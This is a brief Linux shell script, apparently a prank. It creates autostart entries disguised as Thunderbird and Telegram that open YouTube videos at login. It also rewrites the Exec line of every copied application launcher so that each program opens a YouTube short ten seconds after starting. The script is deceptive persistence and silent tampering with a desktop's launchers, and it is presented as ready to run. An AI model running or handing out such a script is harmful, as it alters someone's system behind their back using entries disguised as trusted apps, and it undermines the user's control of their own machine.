cd ~/.config/autostart
echo "[Desktop Entry]
Exec=xdg-open https://www.youtube.com/watch?v=HIcSWuKMwOw
Type=Application
Name=Thunderbird
Icon=org.mozilla.Thunderbird
" > Thunderbird-Client.desktop

echo "[Desktop Entry]
Exec=xdg-open https://www.youtube.com/watch?v=ORuTA9a_YVo
Name=Telegram
Type=Application
Icon=org.telegram.desktop
" > Telegram.desktop

cp -r ~/.local/share/applications/ ~/.local/share/applications_backup/
cp -r /usr/share/applications ~/.local/share

for f in ~/.local/share/applications/*.desktop; do
    sed -ri 's/Exec=(.*)/Exec=bash -c "\1 \&\& sleep 10 \&\& xdg-open https:\/\/www.youtube.com\/shorts\/YJWSAJjkTsI"/g' $f
done
